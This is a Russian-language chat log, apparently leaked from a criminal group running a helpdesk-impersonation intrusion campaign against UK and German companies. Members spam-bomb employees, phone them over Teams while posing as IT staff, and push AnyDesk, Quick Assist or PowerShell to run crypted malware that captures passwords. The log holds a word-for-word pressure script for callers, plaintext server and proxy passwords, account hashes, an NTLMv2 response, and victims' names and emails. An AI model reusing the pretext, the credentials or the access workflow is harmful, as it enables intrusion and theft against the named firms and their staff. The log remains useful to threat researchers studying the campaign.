+[2024-06-19 11:13:52] @usernamemm:matrix.bestflowers247.online: `BUCHERHYDRAULICS.COM/a100-gk:19c72bc000d8a81ddfabe23b9acc7f10:a100-gk`
+--------------------
+[2024-06-19 11:14:35] @usernamemm:matrix.bestflowers247.online: `BUCHERHYDRAULICS.COM/a100-kh:54856512005d65e17b942f894206fc31:a100-kh`
+--------------------
+[2024-06-19 11:15:47] @usernamegg:matrix.bestflowers247.online: да
+--------------------
+[2024-06-19 11:16:47] @usernamegg:matrix.bestflowers247.online: жду пароль от него
+--------------------
+[2024-06-19 11:18:37] @burito:matrix.bestflowers247.online: > <@usernamegg:matrix.bestflowers247.online> ulan.exe
+
+строка DETJthvGharSnJSalDnsJyOMhyNPkY
+--------------------
+[2024-06-19 11:18:37] @burito:matrix.bestflowers247.online: ulan.zip
+--------------------
+[2024-06-19 11:18:58] @usernamegg:matrix.bestflowers247.online: ++
+--------------------
+[2024-06-19 11:19:42] @burito:matrix.bestflowers247.online: привет. и снова седая ночь
+--------------------
+[2024-06-19 11:19:49] @burito:matrix.bestflowers247.online: 19RdXdWXKJxf8SFndnvvpCAxUptBbQpqgG
+--------------------
+[2024-06-19 11:19:56] @usernamegg:matrix.bestflowers247.online: ++
+--------------------
+[2024-06-19 11:21:47] @mel:artronica.rocks: MonsuruAdekunle@ukrsaqroup.onmicrosoft.com
+--------------------
+[2024-06-19 11:21:55] @mel:artronica.rocks: вот новый акк
+--------------------
+[2024-06-19 11:21:59] @mel:artronica.rocks: таргеты там уже добавлены
+--------------------
+[2024-06-19 11:22:03] @mel:artronica.rocks: и проспамлены
+--------------------
+[2024-06-19 11:22:14] @lincoln:artronica.rocks: окей этот не обзваниваем дальше
+--------------------
+[2024-06-19 11:22:18] @mel:artronica.rocks: пароль
+--------------------
+[2024-06-19 11:22:21] @mel:artronica.rocks: aa112JKHVF*&2ssss
+--------------------
+[2024-06-19 11:22:24] @lincoln:artronica.rocks: ничего нельзя сделать с этой нашей дамой ?
+--------------------
+[2024-06-19 11:22:35] @mel:artronica.rocks: щас протестим с тобой
+--------------------
+[2024-06-19 11:22:39] @mel:artronica.rocks: отправку файла
+--------------------
+[2024-06-19 11:22:52] @lincoln:artronica.rocks: добавишь в какой аккаунт ?
+--------------------
+[2024-06-19 11:23:00] @mel:artronica.rocks: > <@mel:artronica.rocks> MonsuruAdekunle@ukrsaqroup.onmicrosoft.com
+
+Monsuru Adekunle
+--------------------
+[2024-06-19 11:23:09] @mel:artronica.rocks: Assistant IT Audit Manager UK International
+--------------------
+[2024-06-19 11:23:18] @mel:artronica.rocks: так тебя зовут и твоя должность
+--------------------
+[2024-06-19 11:23:27] @lincoln:artronica.rocks: +
+--------------------
+[2024-06-19 11:24:10] @mel:artronica.rocks: JoeCarr@wtwcocom.onmicrosoft.com
+--------------------
+[2024-06-19 11:24:16] @mel:artronica.rocks: сюда звони
+--------------------
+[2024-06-19 11:24:32] @mel:artronica.rocks: для теста
+--------------------
+[2024-06-19 11:26:00] @lincoln:artronica.rocks: +
+--------------------
+[2024-06-19 11:27:22] @lincoln:artronica.rocks: https://prnt.sc/5Sc1os0_RkDF
+--------------------
+[2024-06-19 11:27:26] @lincoln:artronica.rocks: он не дает добавить )
+--------------------
+[2024-06-19 11:28:01] @lincoln:artronica.rocks: набираю
+--------------------
+[2024-06-19 11:29:10] @mel:artronica.rocks: подожди
+--------------------
+[2024-06-19 11:29:16] @lincoln:artronica.rocks: +
+--------------------
+[2024-06-19 11:29:21] @mel:artronica.rocks: ты звонишь через звонок или через встречу?
+--------------------
+[2024-06-19 11:29:28] @lincoln:artronica.rocks: звонок
+--------------------
+[2024-06-19 11:29:58] @ugw:artronica.rocks: хм
+--------------------
+[2024-06-19 11:29:59] @ugw:artronica.rocks: минуту
+--------------------
+[2024-06-19 11:30:15] @usernamegg:matrix.bestflowers247.online: это парень который Uk звонит он давно с нами работает, он еще c s класса
+--------------------
+[2024-06-19 11:34:53] @lincoln:artronica.rocks: все супер
+--------------------
+[2024-06-19 11:34:54] @lincoln:artronica.rocks: поехали
+--------------------
+[2024-06-19 11:35:38] @usernameyy:matrix.bestflowers247.online: ```
+Main IP: 23.95.182.44
+Username: Administrator
+Password: 6bdfbRJ_SV*9R&^awhMw=*hv54j_90
+Креды к хвнс
+wPZQBfecwMCTfVNnHjoe
+.G~89wc7:uZK-vu8G*MU
+pghPT5-ygpln8-qo4pvk-5Q707Y-W18Ys5-hWQxVP
+--------------------
+[2024-06-19 11:35:53] @usernameyy:matrix.bestflowers247.online: build.exe
+--------------------
+[2024-06-19 11:35:59] @usernameyy:matrix.bestflowers247.online: Han: burrito
+--------------------
+[2024-06-19 11:36:46] @usernamegg:matrix.bestflowers247.online: 77.238.245.233:31004:VlDYvSRQ:paXXaCiB
+--------------------
+[2024-06-19 11:37:05] @muaddib6:matrix.org: занимаюсь
+--------------------
+[2024-06-19 11:39:45] @lincoln:artronica.rocks: Melanie Porter (UK) (внешний) есть ее номер ?
+--------------------
+[2024-06-19 11:39:50] @lincoln:artronica.rocks: телефона
+--------------------
+[2024-06-19 11:40:15] @mel:artronica.rocks: зачем?
+--------------------
+[2024-06-19 11:40:23] @lincoln:artronica.rocks: я с ней на линии )
+--------------------
+[2024-06-19 11:40:30] @lincoln:artronica.rocks: она просит ее номер телефона
+--------------------
+[2024-06-19 11:40:32] @lincoln:artronica.rocks: есть или нет
+--------------------
+[2024-06-19 11:40:35] @lincoln:artronica.rocks: да или нет
+--------------------
+[2024-06-19 11:40:55] @ugw:artronica.rocks: под рукой нет, сейчас поищем
+--------------------
+[2024-06-19 11:42:05] @lincoln:artronica.rocks: дальше иду
+--------------------
+[2024-06-19 11:42:06] @mel:artronica.rocks: +442071117000
+--------------------
+[2024-06-19 11:42:19] @usernamegg:matrix.bestflowers247.online: dll, ghostsocks password
+--------------------
+[2024-06-19 11:42:25] @usernamegg:matrix.bestflowers247.online: Ghocks_ulan (2).zip
+--------------------
+[2024-06-19 11:43:01] @muaddib6:matrix.org: +
+--------------------
+[2024-06-19 11:44:37] @lincoln:artronica.rocks: сейчас на линии
+--------------------
+[2024-06-19 11:44:50] @lincoln:artronica.rocks: teamviewer ставит
+--------------------
+[2024-06-19 11:44:59] @lincoln:artronica.rocks: тоже не может
+--------------------
+[2024-06-19 11:45:09] @mel:artronica.rocks: на тупые вопросы - ответ один - Я понимаю ваше беспокойство, но к сожалению, у меня совсем мало времени. У меня большой список сотрудников который мне нужно обработать. Произошла спам атака и наша группа должна в короткие сроки обеспечить защиту. Поэтому если вы готовы сейчас к тому, что я вам обеспечу эту защиту, то давайте. Если нет, я вернусь к вам позже после того как я пройду весь список.
+--------------------
+[2024-06-19 11:45:20] @ugw:artronica.rocks: > <@lincoln:artronica.rocks> тоже не может
+
+файл в чат
+--------------------
+[2024-06-19 11:45:21] @mel:artronica.rocks: > <@lincoln:artronica.rocks> teamviewer ставит
+
+через чат анидеск отправь
+--------------------
+[2024-06-19 11:45:25] @lincoln:artronica.rocks: да
+--------------------
+[2024-06-19 11:45:28] @ugw:artronica.rocks: пусть так ставит
+--------------------
+[2024-06-19 11:46:35] @lincoln:artronica.rocks: сейчас в powershell делаю
+--------------------
+[2024-06-19 11:48:20] @usernamegg:matrix.bestflowers247.online: > <@usernameyy:matrix.bestflowers247.online> sent a file.
+
+https://avcheck.net/id/GzO2CQcMSPfP
+--------------------
+[2024-06-19 11:48:31] @usernamegg:matrix.bestflowers247.online: тут все очень печально, надо сделать максимально чисто
+--------------------
+[2024-06-19 11:48:38] @usernamegg:matrix.bestflowers247.online: там трастовый домен
+--------------------
+[2024-06-19 11:48:39] @lincoln:artronica.rocks: https://prnt.sc/KVyzdu9lsvcY
+--------------------
+[2024-06-19 11:49:23] @muaddib6:matrix.org: ++
+--------------------
+[2024-06-19 11:49:38] @usernameugway:matrix.bestflowers247.online: нормальный?
+--------------------
+[2024-06-19 11:51:52] @usernamegg:matrix.bestflowers247.online: да
+--------------------
+[2024-06-19 11:52:02] @usernameugway:matrix.bestflowers247.online: сейас скинем дедик
+--------------------
+[2024-06-19 11:52:05] @usernameugway:matrix.bestflowers247.online: подрубились
+--------------------
+[2024-06-19 11:52:09] @lincoln:artronica.rocks: https://prnt.sc/MX6vAjphrpQe
+--------------------
+[2024-06-19 11:52:17] @lincoln:artronica.rocks: видишь
+--------------------
+[2024-06-19 11:52:25] @lincoln:artronica.rocks: какие еще варианты у нас ,
+--------------------
+[2024-06-19 11:52:26] @lincoln:artronica.rocks: ?
+--------------------
+[2024-06-19 11:52:44] @mel:artronica.rocks: ты доступен?
+--------------------
+[2024-06-19 11:52:45] @mel:artronica.rocks: 95.164.88.73
+--------------------
+[2024-06-19 11:52:50] @mel:artronica.rocks: на этом клиент
+--------------------
+[2024-06-19 11:52:54] @mel:artronica.rocks: возьмешь?
+--------------------
+[2024-06-19 11:53:52] @ugw:artronica.rocks: думаем
+--------------------
+[2024-06-19 11:54:00] @lincoln:artronica.rocks: она хорошая и готова
+--------------------
+[2024-06-19 11:54:15] @ugw:artronica.rocks: эник и вивер не ставятся
+--------------------
+[2024-06-19 11:54:21] @ugw:artronica.rocks: повершелл тоже
+--------------------
+[2024-06-19 11:54:57] @lincoln:artronica.rocks: давайте через
+--------------------
+[2024-06-19 11:55:03] @lincoln:artronica.rocks: quick assist ебанем ее
+--------------------
+[2024-06-19 11:55:13] @lincoln:artronica.rocks: ctrl+win+q
+--------------------
+[2024-06-19 11:55:19] @lincoln:artronica.rocks: вы можете ?
+--------------------
+[2024-06-19 11:55:27] @ugw:artronica.rocks: там есть обмен файлами ?
+--------------------
+[2024-06-19 11:55:39] @lincoln:artronica.rocks: он работает как team viewer
+--------------------
+[2024-06-19 11:55:45] @lincoln:artronica.rocks: cmd можно запустить
+--------------------
+[2024-06-19 11:55:54] @usernamegg:matrix.bestflowers247.online: ++
+--------------------
+[2024-06-19 11:55:58] @usernamegg:matrix.bestflowers247.online: ++
+--------------------
+[2024-06-19 11:56:04] @ugw:artronica.rocks: если ничего не работает давай пробовать
+--------------------
+[2024-06-19 11:56:16] @lincoln:artronica.rocks: заходите
+--------------------
+[2024-06-19 11:56:22] @lincoln:artronica.rocks: помочь кому-то
+--------------------
+[2024-06-19 11:56:25] @mel:artronica.rocks: файлы залил к нему
+--------------------
+[2024-06-19 11:56:26] @mel:artronica.rocks: как обычно
+--------------------
+[2024-06-19 11:56:47] @usernamemm:matrix.bestflowers247.online: `BUCHERHYDRAULICS.COM/ProbstG:077088f2e594efa73c417f2a8cf0e8eb:ProbstG`
+--------------------
+[2024-06-19 11:56:55] @mel:artronica.rocks: у нас они лежат на раб столе в папке 19.06.24
+--------------------
+[2024-06-19 11:57:00] @mel:artronica.rocks: еще не запускал
+--------------------
+[2024-06-19 11:57:04] @mel:artronica.rocks: сессия в тививере
+--------------------
+[2024-06-19 11:57:19] @lincoln:artronica.rocks: https://prnt.sc/5ht6h6Aa7gg4
+--------------------
+[2024-06-19 11:57:28] @ugw:artronica.rocks: сатавим
+--------------------
+[2024-06-19 11:57:28] @ugw:artronica.rocks: сек
+--------------------
+[2024-06-19 11:57:33] @lincoln:artronica.rocks: у нее даже это заблочено
+--------------------
+[2024-06-19 11:57:37] @lincoln:artronica.rocks: пиздец полный
+--------------------
+[2024-06-19 11:58:19] @ugw:artronica.rocks: давай перезвоним найдем решение
+--------------------
+[2024-06-19 11:58:24] @lincoln:artronica.rocks: давай
+--------------------
+[2024-06-19 11:58:27] @lincoln:artronica.rocks: давай ты сначала
+--------------------
+[2024-06-19 11:58:29] @lincoln:artronica.rocks: скажешь какое
+--------------------
+[2024-06-19 11:58:34] @mel:artronica.rocks: Headquarters
+24 Eberspächerstrasse, Esslingen, Baden-Wuertte...
+Phone Number
++49 71193900
+Website
+www.eberspaecher.com
+Revenue
+$5.4 Billion
+Industry
+Motor Vehicle Parts
+Manufacturing
+--------------------
+[2024-06-19 11:58:36] @lincoln:artronica.rocks: ну что мне говорить
+--------------------
+[2024-06-19 11:58:49] @lincoln:artronica.rocks: она ждет звонка и готова сделать все
+--------------------
+[2024-06-19 11:58:50] @ugw:artronica.rocks: да не понятно у нее все выпелено
+--------------------
+[2024-06-19 11:58:58] @ugw:artronica.rocks: ок подумаем
+--------------------
+[2024-06-19 11:59:01] @lincoln:artronica.rocks: дак вот я перезвонил
+--------------------
+[2024-06-19 11:59:06] @lincoln:artronica.rocks: и что делать ?
+--------------------
+[2024-06-19 11:59:40] @lincoln:artronica.rocks: перезвонить то я могу в любой момент
+--------------------
+[2024-06-19 11:59:47] @lincoln:artronica.rocks: давай-те обсудим сейчас
+--------------------
+[2024-06-19 11:59:59] @ugw:artronica.rocks: что обсудим
+--------------------
+[2024-06-19 12:00:04] @usernamemm:matrix.bestflowers247.online: `b92f50d17400634b678b36ec7912aaa4`
+--------------------
+[2024-06-19 12:00:12] @lincoln:artronica.rocks: давай перезвоним найдем решение
+--------------------
+[2024-06-19 12:00:19] @lincoln:artronica.rocks: сейчас перезванивать или ет
+--------------------
+[2024-06-19 12:00:20] @lincoln:artronica.rocks: нет
+--------------------
+[2024-06-19 12:00:29] @ugw:artronica.rocks: не сейчас
+--------------------
+[2024-06-19 12:00:29] @ugw:artronica.rocks: сейчас дальше идем
+--------------------
+[2024-06-19 12:00:33] @lincoln:artronica.rocks: хорошо
+--------------------
+[2024-06-19 12:01:39] @ugw:artronica.rocks: идем по списку . если ничего не работает -  думаем  что делать , как найдем решение - отпишем
+
+1. эник
+2. тим вивер
+3. повершелл
+4. установочный через чат
+5.  квикассист
+--------------------
+[2024-06-19 12:01:56] @lincoln:artronica.rocks: я понимаю
+--------------------
+[2024-06-19 12:02:04] @lincoln:artronica.rocks: =
+--------------------
+[2024-06-19 12:02:05] @lincoln:artronica.rocks: +
+--------------------
+[2024-06-19 12:09:15] @lincoln:artronica.rocks: компания огонь и контакт есть
+--------------------
+[2024-06-19 12:09:19] @lincoln:artronica.rocks: таргет шикарный
+--------------------
+[2024-06-19 12:11:26] @usernamegg:matrix.bestflowers247.online: qwertyuio.txt
+--------------------
+[2024-06-19 12:11:34] @usernamezz:matrix.bestflowers247.online: ++
+--------------------
+[2024-06-19 12:12:22] @ugw:artronica.rocks: смотри когда мы зашли и вылатет окно ввода лог пасс
+там уже происан его логин
+
+и если пасс не подходит пусть таргет проверит логин , не исключено что подтянулся не его
+--------------------
+[2024-06-19 12:12:30] @mel:artronica.rocks: напиши как освободится впс
+--------------------
+[2024-06-19 12:12:39] @mel:artronica.rocks: они щас обе заняты еще, так?
+--------------------
+[2024-06-19 12:13:47] @usernameyy:matrix.bestflowers247.online: update.zip
+--------------------
+[2024-06-19 12:14:05] @usernameyy:matrix.bestflowers247.online: AntiSpam.exe
+--------------------
+[2024-06-19 12:14:07] @usernamegg:matrix.bestflowers247.online: update.zip
+--------------------
+[2024-06-19 12:14:08] @usernamegg:matrix.bestflowers247.online: update.zip
+--------------------
+[2024-06-19 12:14:33] @usernameugway:matrix.bestflowers247.online: принял
+--------------------
+[2024-06-19 12:14:43] @lincoln:artronica.rocks: я понимаю
+--------------------
+[2024-06-19 12:14:50] @lincoln:artronica.rocks: это если через powershell
+--------------------
+[2024-06-19 12:14:57] @lincoln:artronica.rocks: мы с ней делали 3-4 раза
+--------------------
+[2024-06-19 12:15:15] @ugw:artronica.rocks: не
+--------------------
+[2024-06-19 12:15:20] @ugw:artronica.rocks: это если дали сессию эника уже
+--------------------
+[2024-06-19 12:15:27] @ugw:artronica.rocks: мы там
+--------------------
+[2024-06-19 12:15:29] @ugw:artronica.rocks: все сделали
+--------------------
+[2024-06-19 12:15:33] @ugw:artronica.rocks: и у нее выскакивает окно
+--------------------
+[2024-06-19 12:15:40] @lincoln:artronica.rocks: хорошо
+--------------------
+[2024-06-19 12:15:55] @lincoln:artronica.rocks: я уже третий раз не могу anydesk поставить
+--------------------
+[2024-06-19 12:16:02] @lincoln:artronica.rocks: у меня блоки у всех со всех сторон
+--------------------
+[2024-06-19 12:16:10] @ugw:artronica.rocks: image.png
+--------------------
+[2024-06-19 12:16:17] @ugw:artronica.rocks: такое окно будет
+--------------------
+[2024-06-19 12:16:21] @lincoln:artronica.rocks: да этот момент я понимаю
+--------------------
+[2024-06-19 12:16:29] @lincoln:artronica.rocks: убираем username
+--------------------
+[2024-06-19 12:16:40] @lincoln:artronica.rocks: и чтоб человек вводил свой username+pass
+--------------------
+[2024-06-19 12:18:47] @ugw:artronica.rocks: убираем только в случае если не подошло
+--------------------
+[2024-06-19 12:18:56] @usernamegg:matrix.bestflowers247.online: да
+--------------------
+[2024-06-19 12:19:00] @usernamegg:matrix.bestflowers247.online: обе заняты
+--------------------
+[2024-06-19 12:19:01] @lincoln:artronica.rocks: да я понимаю
+--------------------
+[2024-06-19 12:19:02] @lincoln:artronica.rocks: конечно
+--------------------
+[2024-06-19 12:19:07] @mel:artronica.rocks: файл принял
+--------------------
+[2024-06-19 12:19:12] @mel:artronica.rocks: на третью заль.
+--------------------
+[2024-06-19 12:19:15] @mel:artronica.rocks: залью
+--------------------
+[2024-06-19 12:23:33] @usernamezz:matrix.bestflowers247.online: `e1113386::DEES:1122334455667788:66946b1404adb57047126d774dfa2628:010100000000000025f5927743c2da01cf0428b4eb808f440000000008003000300000000000000000000000002000007d5aeaeb7a31058c54059d2c94f3ab87bfd3d3c7ac66c208b7caf779fda2d50e0a0010000000000000000000000000000000000009001a0044004500450053005c00650031003100310033003300380036000000000000000000`
+--------------------
+[2024-06-19 12:25:03] @usernamegg:matrix.bestflowers247.online: 91.196.70.160:38875
+91.196.70.160:45339
+--------------------
+[2024-06-19 12:25:36] @lincoln:artronica.rocks: https://prnt.sc/gzPGtffXz7rz
+--------------------
+[2024-06-19 12:26:24] @lincoln:artronica.rocks: https://prnt.sc/hq57_uPXY7oH
+--------------------
+[2024-06-19 12:26:32] @lincoln:artronica.rocks: тоже самое у него
+--------------------
+[2024-06-19 12:26:37] @lincoln:artronica.rocks: со всех сторон блоки
+--------------------
+[2024-06-19 12:27:03] @mel:artronica.rocks: через чат
+--------------------
+[2024-06-19 12:27:04] @mel:artronica.rocks: залей
+--------------------
+[2024-06-19 12:27:06] @mel:artronica.rocks: файл
+--------------------
+[2024-06-19 12:27:08] @mel:artronica.rocks: с анидеском
+--------------------
+[2024-06-19 12:27:18] @mel:artronica.rocks: и пусть установит
+--------------------
+[2024-06-19 12:27:45] @lincoln:artronica.rocks: да )
+--------------------
+[2024-06-19 12:27:50] @lincoln:artronica.rocks: понятное дело
+--------------------
+[2024-06-19 12:29:47] @lincoln:artronica.rocks: тоже самое
+--------------------
+[2024-06-19 12:29:51] @lincoln:artronica.rocks: третий сотрудник
+--------------------
+[2024-06-19 12:30:57] @usernamemm:matrix.bestflowers247.online: ```
+AX\slynch
+accidentexchange.localnet
+```
+--------------------
+[2024-06-19 12:32:09] @usernamegg:matrix.bestflowers247.online: 91.142.73.198:46246:9Cy5Yiyd:8Qk3UJm5
+--------------------
+[2024-06-19 12:32:48] @lincoln:artronica.rocks: что делаем ?
+--------------------
+[2024-06-19 12:32:51] @lincoln:artronica.rocks: какие опции
+--------------------
+[2024-06-19 12:32:56] @mel:artronica.rocks: продолжаем
+--------------------
+[2024-06-19 12:33:04] @burito:matrix.bestflowers247.online: > <@usernameyy:matrix.bestflowers247.online> build.exe
+
+у меня не работает после крипта, хотя поддержку .NET сделал
+--------------------
+[2024-06-19 12:33:04] @burito:matrix.bestflowers247.online: странно
+--------------------
+[2024-06-19 12:33:05] @usernamegg:matrix.bestflowers247.online: AX\slynch
+accidentexchange.localnet
+
+--------------------
+[2024-06-19 12:33:06] @mel:artronica.rocks: не у всех одинаковые ограничения
+--------------------
+[2024-06-19 12:33:12] @usernamegg:matrix.bestflowers247.online: вот этому перезвонить надо
+--------------------
+[2024-06-19 12:33:15] @usernamegg:matrix.bestflowers247.online: со вчера он
+--------------------
+[2024-06-19 12:33:17] @lincoln:artronica.rocks: ну хорошо
+--------------------
+[2024-06-19 12:33:21] @lincoln:artronica.rocks: у меня еще два звонка и все
+--------------------
+[2024-06-19 12:33:22] @usernamegg:matrix.bestflowers247.online: найдите его
+--------------------
+[2024-06-19 12:33:22] @lincoln:artronica.rocks: ладно
+--------------------
+[2024-06-19 12:33:30] @usernameyy:matrix.bestflowers247.online: ты .net тоже криптуешь?
+--------------------
+[2024-06-19 12:33:55] @muaddib6:matrix.org: У меня тоже есть огранчения, но я попробую сделать чисто
+--------------------
+[2024-06-19 12:33:57] @mel:artronica.rocks: попробуем
+--------------------
+[2024-06-19 12:33:58] @burito:matrix.bestflowers247.online: > <@usernameyy:matrix.bestflowers247.online> ты .net тоже криптуешь?
+
+да
+--------------------
+[2024-06-19 12:34:08] @burito:matrix.bestflowers247.online: но этот чего-то не хочет
+--------------------
+[2024-06-19 12:34:09] @mel:artronica.rocks: больше нет опознавательных знаков?
+--------------------
+[2024-06-19 12:37:01] @lincoln:artronica.rocks: тут ?
+--------------------
+[2024-06-19 12:37:11] @ugw:artronica.rocks: да
+--------------------
+[2024-06-19 12:37:21] @lincoln:artronica.rocks: еще один идет
+--------------------
+[2024-06-19 12:37:46] @mel:artronica.rocks: как закончишь, дай знать
+--------------------
+[2024-06-19 12:37:55] @mel:artronica.rocks: нужно будет позвонить вчерашнему одному
+--------------------
+[2024-06-19 12:38:02] @lincoln:artronica.rocks: без проблема
+--------------------
+[2024-06-19 12:38:11] @mel:artronica.rocks: нашел
+--------------------
+[2024-06-19 12:38:12] @mel:artronica.rocks: slynch@ax-uk.com
+--------------------
+[2024-06-19 12:38:18] @mel:artronica.rocks: наберем
+--------------------
+[2024-06-19 12:38:53] @burito:matrix.bestflowers247.online: > <@usernamegg:matrix.bestflowers247.online> Ghocks_ulan (2).zip
+
+строка hvGharSnJSalDnsJyOMh
+--------------------
+[2024-06-19 12:38:53] @burito:matrix.bestflowers247.online: ulan.zip
+--------------------
+[2024-06-19 12:41:27] @lincoln:artronica.rocks: поехали дальше
+--------------------
+[2024-06-19 12:41:33] @lincoln:artronica.rocks: вообще бы установил без проблем
+--------------------
+[2024-06-19 12:41:53] @mel:artronica.rocks: slynch@ax-uk.com
+--------------------
+[2024-06-19 12:41:58] @mel:artronica.rocks: ты вчера ему звонил
+--------------------
+[2024-06-19 12:42:08] @mel:artronica.rocks: попробуй с того же аккаунта позвонить
+--------------------
+[2024-06-19 12:42:12] @mel:artronica.rocks: щас я его поищу
+--------------------
+[2024-06-19 12:43:58] @lincoln:artronica.rocks: а можешь кинуть аккаунт
+--------------------
+[2024-06-19 12:44:06] @lincoln:artronica.rocks: и что нам нужно от него скажи пожалуйста
+--------------------
+[2024-06-19 12:44:17] @ugw:artronica.rocks: мин
+--------------------
+[2024-06-19 12:44:40] @mel:artronica.rocks: GavinWalker@assistancedeskpro.onmicrosoft.com
+
+aa112JKHVF*&2ssss
+--------------------
+[2024-06-19 12:44:48] @mel:artronica.rocks: нужно сессию поднять
+--------------------
+[2024-06-19 12:44:58] @mel:artronica.rocks: вчера дали нам анидеск и мы там работали
+--------------------
+[2024-06-19 12:45:05] @mel:artronica.rocks: нужно связь восстановить
+--------------------
+[2024-06-19 12:45:12] @mel:artronica.rocks: и кое что туда залить еще
+--------------------
+[2024-06-19 12:45:18] @mel:artronica.rocks: связь с ним пропала
+--------------------
+[2024-06-19 12:46:01] @usernamegg:matrix.bestflowers247.online: да
+--------------------
+[2024-06-19 12:46:03] @usernamegg:matrix.bestflowers247.online: ему
+--------------------
+[2024-06-19 12:46:10] @usernamegg:matrix.bestflowers247.online: он норм чувак
+--------------------
+[2024-06-19 12:46:12] @mel:artronica.rocks: объясни что нам нужно еще одно обновление сделать
+--------------------
+[2024-06-19 12:46:15] @usernamegg:matrix.bestflowers247.online: там сейчас все запустим у него
+--------------------
+[2024-06-19 12:46:29] @mel:artronica.rocks: сейчас позвоним ему
+--------------------
+[2024-06-19 12:46:37] @mel:artronica.rocks: задачу отдал уже
+--------------------
+[2024-06-19 12:46:39] @usernamegg:matrix.bestflowers247.online: slynch@ax-uk.com - доспамить и снова позвонить под предлогом доустановить что то
+--------------------
+[2024-06-19 12:47:07] @mel:artronica.rocks: щас я еще на спам его поставлю
+--------------------
+[2024-06-19 12:47:36] @lincoln:artronica.rocks: хорошо
+--------------------
+[2024-06-19 12:50:48] @lincoln:artronica.rocks: тут
+--------------------
+[2024-06-19 12:50:52] @lincoln:artronica.rocks: аккаунт сдох
+--------------------
+[2024-06-19 12:50:55] @ugw:artronica.rocks: да
+--------------------
+[2024-06-19 12:51:23] @ugw:artronica.rocks: минуту
+--------------------
+[2024-06-19 12:51:54] @ugw:artronica.rocks: WilliamJohnson@safedatanalytics.onmicrosoft.com
+
+--------------------
+[2024-06-19 12:51:57] @burito:matrix.bestflowers247.online: > <@usernameyy:matrix.bestflowers247.online> build.exe
+
+строка arSnJSalDnsJyOM
+--------------------
+[2024-06-19 12:51:57] @burito:matrix.bestflowers247.online: build.zip
+--------------------
+[2024-06-19 12:51:58] @ugw:artronica.rocks: попробуй этот
+--------------------
+[2024-06-19 12:52:02] @burito:matrix.bestflowers247.online: чекни такое
+--------------------
+[2024-06-19 12:54:00] @mel:artronica.rocks: Server IP address: 37.221.126.114
+User: Admin
+Password: 4Uf6a1XbOPja
+--------------------
+[2024-06-19 12:54:04] @mel:artronica.rocks: здесь новый клиент
+--------------------
+[2024-06-19 12:54:29] @lincoln:artronica.rocks: pass: ?
+--------------------
+[2024-06-19 12:54:51] @lincoln:artronica.rocks: aa112JKHVF*&2ssss
+?
+--------------------
+[2024-06-19 12:54:56] @mel:artronica.rocks: файлы залил
+--------------------
+[2024-06-19 12:54:56] @ugw:artronica.rocks: да
+--------------------
+[2024-06-19 12:54:58] @mel:artronica.rocks: как обычно
+--------------------
+[2024-06-19 12:55:05] @usernameugway:matrix.bestflowers247.online: нужен срочно
+--------------------
+[2024-06-19 12:55:07] @usernameugway:matrix.bestflowers247.online: подрубились
+--------------------
+[2024-06-19 12:55:37] @usernamegg:matrix.bestflowers247.online: ага
+--------------------
+[2024-06-19 12:55:39] @usernamegg:matrix.bestflowers247.online: иду
+--------------------
+[2024-06-19 12:56:15] @lincoln:artronica.rocks: отключена
+--------------------
+[2024-06-19 12:56:31] @lincoln:artronica.rocks: не абонент она
+--------------------
+[2024-06-19 12:56:36] @lincoln:artronica.rocks: сандра линч больше
+--------------------
+[2024-06-19 12:56:49] @ugw:artronica.rocks: ок погнали дальше по спискам
+--------------------
+[2024-06-19 12:56:50] @lincoln:artronica.rocks: давайте дальше мне таргеты нужно делать
+--------------------
+[2024-06-19 12:56:57] @lincoln:artronica.rocks: каким ?
+--------------------
+[2024-06-19 12:56:59] @lincoln:artronica.rocks: там все
+--------------------
+[2024-06-19 12:57:06] @ugw:artronica.rocks: 1мин кидаем
+--------------------
+[2024-06-19 12:57:06] @lincoln:artronica.rocks: 4 юзера и у всех такая же проблема
+--------------------
+[2024-06-19 12:57:19] @lincoln:artronica.rocks: 6 человек готовы были
+--------------------
+[2024-06-19 12:57:26] @lincoln:artronica.rocks: хоть комп привезти в юк
+--------------------
+[2024-06-19 12:57:38] @lincoln:artronica.rocks: последняя контора вообще топ
+--------------------
+[2024-06-19 12:58:19] @usernamegg:matrix.bestflowers247.online: ___
+--------------------
+[2024-06-19 12:59:21] @usernameugway:matrix.bestflowers247.online: бро когда будет время - думаю стоит нас обучить делать то что делаешь ты
+--------------------
+[2024-06-19 12:59:27] @usernameugway:matrix.bestflowers247.online: тогда можно выйти на какой-то обьем
+--------------------
+[2024-06-19 12:59:28] @usernameugway:matrix.bestflowers247.online: и тебя разргузить
+--------------------
+[2024-06-19 12:59:47] @usernamegg:matrix.bestflowers247.online: ага
+--------------------
+[2024-06-19 12:59:53] @usernamegg:matrix.bestflowers247.online: куда подключились ?
+--------------------
+[2024-06-19 12:59:58] @usernameugway:matrix.bestflowers247.online: сек
+--------------------
+[2024-06-19 13:00:22] @usernameugway:matrix.bestflowers247.online: Headquarters
+2-4 Hoehnerweg, Weinheim, Baden-Wuerttemberg, 6...
+Phone Number
+(630) 898-3319
+Website
+www.freudenberg.com
+Revenue
+$9.8 Billion
+--------------------
+[2024-06-19 13:00:24] @usernamegg:matrix.bestflowers247.online: запускай AntiSpam
+--------------------
+[2024-06-19 13:00:26] @usernamegg:matrix.bestflowers247.online: ехе
+--------------------
+[2024-06-19 13:00:34] @usernamegg:matrix.bestflowers247.online: пускай вводит пароль
+--------------------
+[2024-06-19 13:00:41] @usernamegg:matrix.bestflowers247.online: потом все остальные ехе стартуй
+--------------------
+[2024-06-19 13:00:51] @mel:artronica.rocks: PhilipSchonewille@sIatergordon.onmicrosoft.com
+--------------------
+[2024-06-19 13:00:52] @usernamegg:matrix.bestflowers247.online: %temp% иди туда
+--------------------
+[2024-06-19 13:00:57] @mel:artronica.rocks: таргеты уже там
+--------------------
+[2024-06-19 13:00:58] @usernamegg:matrix.bestflowers247.online: найди вновь созданый фаил
+--------------------
+[2024-06-19 13:01:02] @usernamegg:matrix.bestflowers247.online: qwerty
+--------------------
+[2024-06-19 13:01:13] @mel:artronica.rocks: тебя зовут Philip Schonewille
+--------------------
+[2024-06-19 13:01:16] @usernamegg:matrix.bestflowers247.online: вытаскивай его и скачивай себе потмо кидай мне
+--------------------
+[2024-06-19 13:01:23] @mel:artronica.rocks: ты Senior Data EngineerBI Developer
+--------------------
+[2024-06-19 13:01:28] @lincoln:artronica.rocks: отлично
+--------------------
+[2024-06-19 13:01:29] @lincoln:artronica.rocks: работаем
+--------------------
+[2024-06-19 13:01:34] @mel:artronica.rocks: начнем через 15 минут
+--------------------
+[2024-06-19 13:01:40] @lincoln:artronica.rocks: очень нужен таргет
+--------------------
